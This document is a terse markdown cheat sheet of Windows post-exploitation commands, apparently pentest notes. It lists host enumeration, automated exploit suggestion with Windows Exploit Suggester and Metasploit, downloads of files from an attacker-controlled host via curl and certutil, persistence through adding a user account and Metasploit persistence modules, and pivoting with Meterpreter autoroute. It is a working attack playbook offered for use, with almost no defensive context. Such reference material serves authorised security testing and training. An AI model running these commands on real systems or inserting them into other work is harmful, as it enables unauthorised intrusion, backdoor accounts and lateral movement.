##  Information collection

List of installed patches

    wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 
Network connections

    netstat -r    # route info
    
    netstat -ano  # connections and the PID
    
    route print
    
    
Processes
 
     tasklist
    
    

Arp table

    arp -a

-------------------------------------------------------------------------------------

## Exploits

   
Auto finding exploits based on system information and installed patches
 
    cmd.exe /c systeminfo > systeminfo.txt

    ./winpwnSuggester.py --update

    ./winpwnSuggester.py --database YYYY-MM-DD-mssb.xls --systeminfo ~/sysinfo.txt
  
    [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)


metasploit exploit suggester module

    post/recon/local_exploit_suggester

-------------------------------------------------------------------------------------

## Downloading files from attacker machine 

    curl http://<ip>:8000/<file> -O <file>
    
    certutil.exe -urlcache -f http://<ip>:8000/<file>
    
    Naviage directly through browser 
    
    ftp <ip>   #On attacker machine: python -m pyftpdlib 21  

    upload  #If using meterpreter


 ## Maintain persistence

  - Add user
  
        net user <username> <pass> /add

  - Metasploit
  
        exploit/windows/local/persistence
        
        exploit/windows/local/registry_persistence

        run persistence -h

  - Set a scheduled task


## Pivoting

 If pwnd target has a connection to a network that we do not have a connection to, we can set up a route on the machine to forward our traffic 
 
   - Meterpreter 
   
         run autoroute -s <target network seen via enumeration>/CIDR
         
         run autoroute -p   #to confirm
         
       you can now test by pinging a device on the remote network
